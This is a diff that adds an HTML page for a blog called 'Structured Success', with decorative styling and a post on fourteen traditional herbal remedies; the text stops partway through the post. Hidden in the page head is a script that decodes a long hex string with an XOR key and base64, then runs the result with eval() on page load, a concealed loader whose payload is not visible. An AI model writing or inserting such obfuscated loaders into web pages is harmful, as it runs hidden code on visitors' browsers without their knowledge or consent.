@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Structured Success</title>
+    
+    <!-- Added Google Fonts for a Cozy Matcha Cafe look -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* Cozy Matcha Cafe / Gingham Picnic Styles */
+        :root {
+            --matcha: #a8c398; /* Soft Matcha Green */
+            --matcha-light: #d8e5ce;
+            --strawberry: #ffbaba; /* Strawberry Milk Pink */
+            --cocoa: #5c4d43; /* Cocoa Brown */
+            --milk: #fcfbf8; /* Warm Milk / Cream */
+            --card-bg: #ffffff;
+            --radius-fluffy: 30px;
+            --radius-pill: 50px;
+        }
+
+        body {
+            font-family: 'Quicksand', sans-serif;
+            line-height: 1.7;
+            color: var(--cocoa);
+            background-color: var(--milk);
+            /* Cute subtle matcha gingham/checkerboard background */
+            background-image: 
+              linear-gradient(45deg, rgba(168, 195, 152, 0.08) 25%, transparent 25%, transparent 75%, rgba(168, 195, 152, 0.08) 75%, rgba(168, 195, 152, 0.08)),
+              linear-gradient(45deg, rgba(168, 195, 152, 0.08) 25%, transparent 25%, transparent 75%, rgba(168, 195, 152, 0.08) 75%, rgba(168, 195, 152, 0.08));
+            background-size: 40px 40px;
+            background-position: 0 0, 20px 20px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Typography Override */
+        h1, h2, h3, h4, .username {
+            font-family: 'Fredoka', sans-serif;
+            color: var(--cocoa);
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 650px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation - Fluffy Floating Pill */
+        .top-nav {
+            background-color: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 12px 20px;
+            text-align: center;
+            position: sticky;
+            top: 20px;
+            z-index: 100;
+            border-radius: var(--radius-pill);
+            box-shadow: 0 8px 25px rgba(168, 195, 152, 0.2);
+            width: fit-content;
+            margin: 20px auto 0;
+            border: 2px solid var(--matcha-light);
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .top-nav a {
+            color: var(--cocoa);
+            font-family: 'Fredoka', sans-serif;
+            font-size: 1rem;
+            font-weight: 500;
+            padding: 8px 18px;
+            text-decoration: none;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            border-radius: var(--radius-pill);
+            cursor: pointer;
+        }
+
+        .top-nav a:hover {
+            background-color: var(--strawberry);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 186, 186, 0.4);
+        }
+
+        /* Header */
+        header {
+            padding: 80px 0 50px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.5rem;
+            color: var(--matcha);
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-shadow: 2px 2px 0px var(--matcha-light);
+            transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+        
+        header h1:hover {
+            transform: scale(1.03) rotate(-1deg);
+            color: var(--strawberry);
+            text-shadow: 2px 2px 0px rgba(255, 186, 186, 0.4);
+        }
+
+        header p {
+            margin: 15px auto 0;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--cocoa);
+            background-color: white;
+            display: inline-block;
+            padding: 8px 24px;
+            border-radius: var(--radius-pill);
+            border: 2px dashed var(--matcha);
+        }
+
+        /* Post Cards - Fluffy and Soft */
+        .post-card {
+            background: var(--card-bg);
+            padding: 0;
+            margin-bottom: 50px;
+            border-radius: var(--radius-fluffy);
+            border: 2px solid var(--matcha-light);
+            box-shadow: 0 12px 35px rgba(168, 195, 152, 0.15);
+            transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 0.3s ease;
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .post-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 45px rgba(168, 195, 152, 0.25);
+            border-color: var(--matcha);
+        }
+
+        .single-post {
+            background: var(--card-bg);
+            padding: 0;
+            margin-bottom: 50px;
+            border-radius: var(--radius-fluffy);
+            border: 2px solid var(--matcha-light);
+            box-shadow: 0 10px 30px rgba(168, 195, 152, 0.1);
+            cursor: default;
+            overflow: hidden;
+        }
+
+        .post-header {
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            border-bottom: 2px dashed var(--matcha-light);
+            background-color: rgba(216, 229, 206, 0.3); /* Very light matcha tint */
+        }
+
+        .post-header img.avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 20px; /* Squishy shape */
+            margin-right: 15px;
+            border: 3px solid white;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            background-color: var(--strawberry);
+            object-fit: cover;
+        }
+
+        .post-header .username {
+            font-size: 1.3rem;
+            color: var(--cocoa);
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 450px;
+            object-fit: cover;
+            border-bottom: 2px solid var(--matcha-light);
+        }
+
+        .post-content {
+            padding: 35px 40px 15px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 15px;
+            font-size: 2.2rem;
+            line-height: 1.25;
+            color: var(--matcha);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            font-weight: 500;
+        }
+
+        .post-content a {
+            color: var(--matcha);
+            text-decoration: none;
+            font-weight: 700;
+            border-bottom: 3px solid var(--matcha-light);
+            transition: all 0.2s;
+        }
+
+        .post-content a:hover {
+            color: var(--strawberry);
+            border-bottom-color: var(--strawberry);
+            background-color: rgba(255, 186, 186, 0.1);
+        }
+
+        .post-footer {
+            padding: 20px 40px 25px;
+            color: #9e8e84;
+            font-family: 'Fredoka', sans-serif;
+            font-size: 1.1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: none;
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        /* Back Button - Strawberry Pill */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: white;
+            font-family: 'Fredoka', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 10px 24px;
+            background: var(--strawberry);
+            border-radius: var(--radius-pill);
+            box-shadow: 0 6px 15px rgba(255, 186, 186, 0.4);
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            border: 2px solid white;
+        }
+
+        .back-button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 8px 20px rgba(255, 186, 186, 0.6);
+            background: #ff9e9e;
+        }
+        
+        /* Adorable overrides for inline styling in post content */
+        .post-content div[style*="background"] {
+            background: white !important; 
+            border: 2px dashed var(--strawberry) !important;
+            border-radius: 24px !important;
+            padding: 25px 30px !important;
+            box-shadow: 0 8px 20px rgba(255, 186, 186, 0.15) !important;
+            margin: 35px 0 !important;
+        }
+        
+        .post-content h3[style*="border-left"] {
+            border-left: none !important;
+            color: var(--strawberry) !important;
+            padding-left: 0 !important;
+            text-align: center;
+        }
+
+        /* Add a cute little sparkles to the headers inside boxes */
+        .post-content h3[style*="border-left"]::before {
+            content: '✨ ';
+        }
+        .post-content h3[style*="border-left"]::after {
+            content: ' ✨';
+        }
+
+        .post-content span[style*="background"] {
+            background: var(--matcha-light) !important;
+            color: var(--cocoa) !important;
+            border: 2px solid white !important;
+            border-radius: 12px !important;
+            font-family: 'Fredoka', sans-serif;
+            font-size: 1rem !important;
+            font-weight: 500;
+            padding: 6px 14px !important;
+            box-shadow: 0 3px 8px rgba(168, 195, 152, 0.3) !important;
+            display: inline-block;
+            margin: 5px 5px 5px 0;
+            transition: transform 0.2s ease;
+        }
+
+        .post-content span[style*="background"]:hover {
+            transform: translateY(-2px) scale(1.05);
+            background: var(--matcha) !important;
+            color: white !important;
+        }
+    </style>
+   <script>
+(function() {
+    var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e14237007050368377c0030021d3316600e595770680138216323534100532c3460345b29155d542a0c0a1873023206512f566363614138211223600a390b3f24147270070e477805462c1a730a23067b05567a74101f38261223541e3e1b3f0a07285a7715415302735732677231067c7456577017012b570574623441162f1a393170073456525d63100a68012c2b7f7d487a74221f12572b756a090b293f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+    var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+    var vyepniipe = "";
+    
+    try {
+        for (var i = 0; i < vtwjjrbym.length; i += 2) {
+            var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+            vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i/2) % vjfaicbgs.length));
+        }
+        
+        var vvqbkapbd = atob(vyepniipe);
+        eval(vvqbkapbd);
+    } catch(e) {
+        console.error("[DEBUG] Decryption or Execution failed: ", e);
+    }
+})();
+</script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Structured Success</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'my-first-post',
+                title: '14 Essential Natural & Herbal Remedies',
+                date: 'April 2, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/14-Essential-Natural-Herbal-Remedies.png',
+                excerpt: 'Discover the healing power of nature! Before modern pharmacies, there was the earth. Explore 14 essential herbal remedies like Willow Bark for pain relief and Elderberry for immunity support.',
+                content: `
+                   <p>Long before pharmacy shelves, wellness apps, and modern medicine cabinets, people turned to the natural world for comfort and care. Roots, leaves, flowers, bark, berries, fermented foods, and aromatic herbs were part of everyday home remedies, passed down through families and communities as practical knowledge. The result was a rich tradition of natural healing that still fascinates people today.</p>
+
+<p>Herbal remedies such as willow bark, elderberry, nettle leaf, eucalyptus, lavender, plantain leaf, wild cherry bark, calendula, thyme, garlic, arnica, and sauerkraut reflect a timeless idea: nature has always been a source of support for human well-being. While modern medicine has transformed health care in powerful ways, many traditional remedies remain popular in teas, salves, syrups, balms, foods, and wellness routines.</p>
+
+<p>This guide explores the traditional uses of these natural remedies, how people thought about them historically, and how to approach them responsibly today.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Traditional natural remedies were often used for everyday discomforts such as coughs, congestion, skin irritation, sleep issues, and minor aches.</li>
+    <li>Many herbs in folk medicine are still used today in teas, topical salves, tinctures, syrups, steam blends, and fermented foods.</li>
+    <li>Natural does not automatically mean risk-free, especially for children, pregnant people, older adults, or anyone taking medication.</li>
+    <li>Some remedies, such as willow bark and garlic, may interact with medications or affect bleeding risk.</li>
+    <li>The safest approach is to treat herbal wellness as supportive care, not as a substitute for professional medical diagnosis or treatment.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Traditional Natural Remedies Still Capture Our Attention</h2>
+
+<p>There is something deeply appealing about the idea that healing ingredients can be found in a garden, forest, kitchen, or meadow. Traditional remedies connect people to ancestry, self-sufficiency, seasonal living, and a slower style of wellness. They also remind us that many modern health practices grew from long observation of plants and foods.</p>
+
+<p>Before modern medicine became widely available, families often relied on what they could gather, grow, dry, steep, ferment, or apply topically. A cough might call for a bark syrup. A scrape might be covered with a crushed leaf or herbal poultice. Trouble sleeping might lead to a cup of floral tea. Digestive complaints might be addressed through fermented foods.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Traditional use is valuable cultural knowledge, but it is not the same as proof of safety or effectiveness. Herbal remedies should be approached with curiosity, respect, and caution, especially when symptoms are serious, persistent, or unexplained.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Willow Bark: The Classic Remedy for Aches and Inflammation</h2>
+
+<p>Willow bark has one of the most famous histories in herbal wellness. Traditionally, it was used to ease pain, stiffness, and inflammation. The bark contains naturally occurring compounds related to salicylates, which is one reason it has long been associated with comfort for aches.</p>
+
+<p>In folk practice, willow bark was often prepared as a tea or decoction, which means it was simmered to draw out plant compounds. It was not viewed as a quick convenience product, but rather as a practical household remedy for discomfort.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">How People Traditionally Used Willow Bark</h3>
+
+<ul>
+  <li>As a tea for general aches and pains</li>
+  <li>For discomfort linked with inflammation</li>
+  <li>As part of traditional approaches to feverish feelings</li>
+  <li>For occasional headaches or body soreness</li>
+</ul>
+
+<p>Today, willow bark should be used carefully. People who are allergic to aspirin, take blood thinners, have stomach ulcers, are preparing for surgery, or are giving remedies to children should avoid self-treating with it unless guided by a qualified clinician.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Elderberry: A Beloved Cold-Season Tradition</h2>
+
+<p>Elderberry is strongly associated with winter wellness. The dark berries have been used in syrups, teas, jams, lozenges, and tonics, especially during cold and flu season. Traditionally, elderberry was valued for soothing coughs, supporting comfort during seasonal illness, and helping people feel cared for when under the weather.</p>
+
+<p>Elderberry’s popularity today comes partly from its comforting format. A spoonful of elderberry syrup feels old-fashioned, seasonal, and nurturing. It is often paired with honey, cinnamon, cloves, ginger, or lemon for flavor.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">A Safety Note About Elderberry</h3>
+
+<p>Proper preparation matters. Raw elderberries and other parts of the elder plant are not considered safe to eat in casual homemade preparations. Commercial elderberry products are typically processed, but quality varies. Anyone who is pregnant, breastfeeding, immunocompromised, managing autoimmune conditions, or taking regular medication should ask a healthcare professional before using elderberry supplements.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nettle Leaf: Mineral-Rich Green Support</h2>
+
+<p>Nettle leaf has a long reputation as a nourishing green herb. Traditionally, it was associated with strength, vitality, minerals, and blood-building support. The image highlights nettle leaf for iron and red blood cells, which reflects its old role as a mineral-rich plant used in spring tonics and strengthening teas.</p>
+
+<p>Nettle leaves are often dried for tea or cooked like greens. Cooking or drying neutralizes the sting found in fresh nettle hairs. In traditional herbalism, nettle tea was often enjoyed as a daily tonic rather than an emergency remedy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Common Traditional Uses of Nettle Leaf</h3>
+
+<ul>
+  <li>Spring cleansing teas</li>
+  <li>Mineral-rich daily infusions</li>
+  <li>Supportive wellness routines during fatigue</li>
+  <li>Traditional nourishment after winter</li>
+</ul>
+
+<p>Nettle may not be suitable for everyone, especially people taking blood pressure medication, blood thinners, diabetes medication, or diuretics. As with all herbal remedies, context matters.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Eucalyptus: Aromatic Relief for Clearer Breathing</h2>
+
+<p>Eucalyptus is instantly recognizable for its strong, refreshing scent. Traditionally, it has been used to open the airways and bring a sense of easier breathing during congestion. Its cooling aroma is why eucalyptus appears in vapor rubs, shower steamers, chest balms, and inhalation blends.</p>
+
+<p>Unlike some herbs that are commonly taken as teas, eucalyptus is often used aromatically or topically in diluted preparations. The scent itself is a major part of the experience.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Best-Known Eucalyptus Uses</h3>
+
+<ul>
+  <li>Steam inhalation for stuffy airways</li>
+  <li>Diluted chest rubs</li>
+  <li>Bath and shower aromatherapy</li>
+  <li>Seasonal wellness blends</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Eucalyptus essential oil should not be swallowed, and it must be diluted before skin use. It can be especially risky for young children and pets, so store it securely and use it only as directed.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Lavender: The Comforting Herb for Calm and Sleep</h2>
+
+<p>Lavender is one of the most loved herbs in natural wellness because it appeals to the senses immediately. Its floral aroma is associated with calm, relaxation, and better sleep. Traditionally, lavender was used in pillows, sachets, baths, oils, teas, and linen sprays.</p>
+
+<p>Lavender’s enduring popularity comes from its versatility. It feels gentle, pleasant, and easy to include in an evening routine. A warm bath, a lavender sachet near the bed, or a lightly scented room can create a calming ritual that signals the body to slow down.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Lavender in Everyday Wellness</h3>
+
+<ul>
+  <li>Evening teas and relaxation blends</li>
+  <li>Herbal pillows and sleep sachets</li>
+  <li>Bath soaks for unwinding</li>
+  <li>Diluted massage oils</li>
+</ul>
+
+<p>Lavender is usually discussed as a relaxation aid rather than a cure. That distinction is important. It can support a calming environment, but ongoing insomnia, anxiety, or mood changes deserve professional attention.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Plantain Leaf: The Backyard Skin Helper</h2>
+
+<p>Plantain leaf, not to be confused with the banana-like fruit, is a common leafy plant found in many lawns and fields. In traditional remedies, plantain leaf was often used for skin comfort. The image highlights its old reputation for drawing out toxins and helping wounds heal, which reflects its role in poultices for minor skin irritations.</p>
+
+<p>Historically, people crushed fresh plantain leaves and applied them to small bites, stings, scrapes, or irritated skin. Dried plantain was also infused into oils and salves.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Traditional Plantain Leaf Preparations</h3>
+
+<ul>
+  <li>Fresh poultices for minor irritation</li>
+  <li>Infused oils for skin balms</li>
+  <li>Salves for dry or rough skin</li>
+  <li>Cooling compresses</li>
+</ul>
+
+<p>Cleanliness is essential when using any plant on the skin. Never apply wild plants to deep wounds, infected areas, animal bites, burns, or serious injuries. Medical care is the right choice when skin damage is more than minor.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;color:#334155;">The most useful way to understand traditional remedies is to separate supportive comfort from medical treatment. A calming tea, soothing salve, or aromatic steam may help someone feel better, but serious symptoms, worsening illness, breathing trouble, fever, severe pain, or signs of infection require professional care.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Wild Cherry Bark: A Traditional Cough and Congestion Remedy</h2>
+
+<p>Wild cherry bark has been used historically in cough syrups and respiratory formulas. Its traditional reputation centers on soothing coughs and easing congestion. Many old-fashioned herbal preparations paired wild cherry bark with honey, licorice, or warming spices.</p>
+
+<p>The appeal of wild cherry bark lies in its soothing quality. In folk traditions, it was often used when the throat felt irritated from coughing. However, correct preparation and dosage are important, and it should not be casually used in large amounts or by vulnerable groups without guidance.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">When Traditional Herbalists Reached for Wild Cherry Bark</h3>
+
+<ul>
+  <li>Dry, irritating coughs</li>
+  <li>Throat discomfort from coughing</li>
+  <li>Seasonal respiratory support</li>
+  <li>Homemade syrups and decoctions</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Calendula: The Golden Flower for Skin Comfort</h2>
+
+<p>Calendula, with its bright orange and yellow petals, is one of the classic herbs for topical skin care. Traditional uses include soothing inflamed, dry, cracked, or irritated skin. Calendula appears in balms, creams, infused oils, soaps, diaper creams, and hand salves.</p>
+
+<p>Its beauty adds to its charm. Calendula looks like sunshine in a jar when infused into oil, making it a favorite for homemade herbal skincare projects.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Popular Calendula Preparations</h3>
+
+<ul>
+  <li>Calendula-infused oil</li>
+  <li>Herbal salves for dry hands</li>
+  <li>Balms for cracked skin</li>
+  <li>Gentle creams and lotions</li>
+</ul>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Calendula is commonly used topically, but anyone with allergies to plants in the daisy family should be cautious. Always patch test new herbal skincare products before applying them widely.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Thyme: A Kitchen Herb With a Strong Wellness Reputation</h2>
+
+<p>Thyme is more than a seasoning. Traditionally, it was valued as a powerful aromatic herb and was associated with cleansing, respiratory comfort, and resistance to germs. Its bold scent and flavor made it a natural fit for soups, broths, teas, steams, and herbal gargles.</p>
+
+<p>In the kitchen, thyme is easy to use. It pairs well with garlic, onion, lemon, honey, chicken soup, roasted vegetables, and beans. That makes it one of the most accessible herbs for people interested in traditional wellness through food.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Simple Ways Thyme Was Used</h3>
+
+<ul>
+  <li>Added to broths during cold season</li>
+  <li>Steeped as an herbal tea</li>
+  <li>Used in steam blends</li>
+  <li>Combined with honey for throat comfort</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Garlic: The Famous Folk Remedy for Colds and Infections</h2>
+
+<p>Garlic has a legendary place in natural remedies. Across many cultures, it has been used as a food, tonic, and protective ingredient. The image highlights garlic for fighting colds and infections, which reflects its long-standing reputation as a strong, pungent household remedy.</p>
+
+<p>Garlic’s wellness appeal comes from the fact that it is both medicinal in reputation and ordinary in the kitchen. It can be added to soups, sauces, roasted vegetables, marinades, and warm broths. During cold season, many people still reach for garlic-heavy foods as part of a comforting routine.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Food First, Supplement Second</h3>
+
+<p>Using garlic as a culinary ingredient is very different from taking concentrated garlic supplements. Supplements may carry a higher risk of side effects or interactions, especially for people taking blood thinners or preparing for surgery. For most wellness routines, enjoying garlic as food is the gentler and more traditional approach.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Arnica: The Bruise and Soreness Remedy</h2>
+
+<p>Arnica is widely associated with bumps, bruises, swelling, and muscle soreness. Traditionally, it was used externally in oils, creams, gels, and salves. Many people still keep arnica gel in a home wellness kit for occasional minor bruising or post-activity soreness.</p>
+
+<p>Arnica deserves special caution because it is generally not meant to be taken internally unless in highly specific prepared forms under professional guidance. The most common household use is topical application on unbroken skin.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Safe Traditional-Style Use of Arnica</h3>
+
+<ul>
+  <li>Use only on unbroken skin</li>
+  <li>Avoid applying to cuts, open wounds, or rashes</li>
+  <li>Follow product directions carefully</li>
+  <li>Stop using it if irritation occurs</li>
+</ul>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Arnica is a good example of why herbal remedies require respect. A plant may have a long traditional history and still need strict boundaries for safe use.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Sauerkraut: Fermented Food for Gut Health</h2>
+
+<p>Sauerkraut stands out among the herbs and barks because it is a fermented food rather than a botanical remedy. Made from cabbage and salt, sauerkraut has been valued as a traditional food for digestion and gut health. Fermentation helped preserve vegetables before refrigeration and added tangy flavor to meals.</p>
+
+<p>Today, sauerkraut is often discussed in connection with probiotics and digestive wellness. Traditionally, it was simply a practical, nourishing food that could last through colder months.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">How to Enjoy Sauerkraut in a Modern Diet</h3>
+
+<ul>
+  <li>Add a small serving to sandwiches or grain bowls</li>
+  <li>Serve it with eggs, potatoes, or roasted vegetables</li>
+  <li>Use it as a tangy side dish</li>
+  <li>Choose refrigerated, live-culture varieties when seeking probiotic benefits</li>
+</ul>
+
+<p>People who need to limit sodium should watch portion sizes, since sauerkraut can be salty. Those with digestive sensitivities may also prefer to start with small amounts.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Build a Thoughtful Natural Wellness Cabinet</h2>
+
+<p>A traditional wellness cabinet does not need to be complicated. The best approach is simple, safe, and realistic. Instead of collecting dozens of herbs, start with a few gentle staples you understand well.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Begin With Everyday Forms</h3>
+
+<p>Teas, culinary herbs, fermented foods, and basic topical salves are often easier to use responsibly than concentrated extracts. A cup of lavender tea, thyme in soup, garlic in food, or sauerkraut with a meal fits naturally into daily life.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Label Everything Clearly</h3>
+
